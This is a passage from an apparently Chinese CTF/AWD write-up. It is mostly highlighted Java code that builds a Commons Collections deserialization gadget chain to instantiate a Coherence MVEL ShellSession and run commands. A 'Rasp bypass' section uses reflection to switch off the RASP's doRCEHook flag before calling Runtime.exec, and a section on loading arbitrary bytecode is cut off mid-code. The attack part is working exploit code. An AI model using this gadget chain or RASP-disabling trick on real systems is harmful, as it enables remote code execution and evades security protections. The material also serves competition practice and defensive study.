</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">decoratemap1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DefaultedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">linkedMap1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;xrntkk1&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="w">        </span><span class="n">decoratemap1</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;xrntkk1&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">decoratemap2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DefaultedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">linkedMap2</span><span class="p">,</span><span class="w"> </span><span class="n">factoryTransformer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="w">        </span><span class="n">decoratemap2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;xrntkk2&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="w">        </span><span class="n">Hashtable</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">ObjectHashtable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Hashtable</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="w">        </span><span class="n">ObjectHashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">decoratemap1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;xrntkk1&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="w">        </span><span class="n">ObjectHashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">decoratemap2</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;xrntkk2&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">linkedMap1</span><span class="p">.</span><span class="na">hashCode</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">linkedMap1</span><span class="p">.</span><span class="na">hashCode</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="w">        </span><span class="n">serialize</span><span class="p">(</span><span class="n">ObjectHashtable</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="w">        </span><span class="n">unserialize</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w">  </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">serializeBase64</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">byteArrayOutputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">objectOutputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">byteArrayOutputStream</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="w">        </span><span class="n">objectOutputStream</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="w">        </span><span class="n">objectOutputStream</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">byteArrayOutputStream</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.bin&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">unserialize</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="w">        </span><span class="n">SecurityObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecurityObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;ser.bin&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">51</span><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">o</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h3 id="rasp-bypass">Rasp bypass<a hidden class="anchor" aria-hidden="true" href="#rasp-bypass">#</a></h3>
<p><img alt="image-20251202105118348" loading="lazy" src="../assets/image-20251202105118348.png"></p>
<p>还有最后一关，也就是rasp</p>
<p><img alt="image-20251202162822805" loading="lazy" src="../assets/image-20251202162822805.png"></p>
<p>在awd-rasp里面有一个叫doRCEHook的静态变量，我们可以从线程中拿到RceHook类，并通过反射将其设置为false，当其为false的时候就不会拦截命令执行。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Java" data-lang="Java"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.tangosol.coherence.mvel2.sh.ShellSession</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.FactoryTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InstantiateFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.DefaultedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LinkedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Hashtable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Set</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">EXP</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="w"></span><span class="c1">//        new ShellSession(&#34;Runtime.getRuntime().exec(\&#34;calc\&#34;)&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="w"></span><span class="c1">//        Runtime.getRuntime().load(&#34;D:\\Downloads\\src-new\\awd-bypass\\test.dll&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="w"></span><span class="c1">//        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();</span><span class="w">
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="w"></span><span class="c1">//        Class&lt;?&gt; aClass = classLoader.loadClass(&#34;com.rasp.hooks.RceHook&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(aClass);</span><span class="w">
</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="w"></span><span class="c1">//        Field[] declaredFields = aClass.getDeclaredFields();</span><span class="w">
</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="w"></span><span class="c1">//        for (Field declaredField : declaredFields) {</span><span class="w">
</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="w"></span><span class="c1">//            System.out.println(declaredField);</span><span class="w">
</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="w"></span><span class="c1">//        }</span><span class="w">
</span></span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="w">        </span><span class="n">FactoryTransformer</span><span class="w"> </span><span class="n">factoryTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FactoryTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InstantiateFactory</span><span class="p">(</span><span class="n">ShellSession</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;doRCEHook=Thread.currentThread().getContextClassLoader().loadClass(\&#34;com.rasp.hooks.RceHook\&#34;).getDeclaredField(\&#34;doRCEHook\&#34;);doRCEHook.setAccessible(true);doRCEHook.set(null, false);Runtime.getRuntime().exec(\&#34;calc\&#34;)&#34;</span><span class="p">}));</span><span class="w">
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="w">        </span><span class="n">LinkedMap</span><span class="w"> </span><span class="n">linkedMap1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="w">        </span><span class="n">LinkedMap</span><span class="w"> </span><span class="n">linkedMap2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">decoratemap1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DefaultedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">linkedMap1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;xrntkk1&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="w">        </span><span class="n">decoratemap1</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;xrntkk1&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">decoratemap2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DefaultedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">linkedMap2</span><span class="p">,</span><span class="w"> </span><span class="n">factoryTransformer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="w">        </span><span class="n">decoratemap2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;xrntkk2&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="w">        </span><span class="n">Hashtable</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">ObjectHashtable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Hashtable</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="w">        </span><span class="n">ObjectHashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">decoratemap1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;xrntkk1&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="w">        </span><span class="n">ObjectHashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">decoratemap2</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;xrntkk2&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(linkedMap1.hashCode());</span><span class="w">
</span></span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(linkedMap1.hashCode());</span><span class="w">
</span></span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="w"></span><span class="c1">//        serialize(ObjectHashtable);</span><span class="w">
</span></span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="w"></span><span class="c1">//        unserialize();</span><span class="w">
</span></span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serializeBase64</span><span class="p">(</span><span class="n">ObjectHashtable</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w">  </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">serializeBase64</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">byteArrayOutputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">objectOutputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">byteArrayOutputStream</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="w">        </span><span class="n">objectOutputStream</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="w">        </span><span class="n">objectOutputStream</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">51</span><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">byteArrayOutputStream</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.bin&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="ln">55</span><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">56</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">57</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">58</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">unserialize</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">59</span><span class="cl"><span class="w">        </span><span class="n">SecurityObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecurityObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;ser.bin&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="ln">60</span><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">61</span><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">o</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">62</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">63</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">64</span><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>加载任意字节码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Java" data-lang="Java"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.tangosol.coherence.mvel2.sh.ShellSession</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.FactoryTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InstantiateFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.DefaultedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LinkedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationTargetException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Hashtable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Set</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">EXP</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchMethodException</span><span class="p">,</span><span class="w"> </span><span class="n">InvocationTargetException</span><span class="p">,</span><span class="w"> </span><span class="n">InstantiationException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="w"></span><span class="c1">//        new ShellSession(&#34;Runtime.getRuntime().exec(\&#34;calc\&#34;)&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="w"></span><span class="c1">//        Runtime.getRuntime().load(&#34;D:\\Downloads\\src-new\\awd-bypass\\test.dll&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="w"></span><span class="c1">//        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();</span><span class="w">
</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="w"></span><span class="c1">//        Class&lt;?&gt; aClass = classLoader.loadClass(&#34;com.rasp.hooks.RceHook&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(aClass);</span><span class="w">
</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="w"></span><span class="c1">//        Field[] declaredFields = aClass.getDeclaredFields();</span><span class="w">
</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="w"></span><span class="c1">//        for (Field declaredField : declaredFields) {</span><span class="w">
</span></span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="w"></span><span class="c1">//            System.out.println(declaredField);</span><span class="w">
</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="w"></span><span class="c1">//        }</span><span class="w">
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="w">
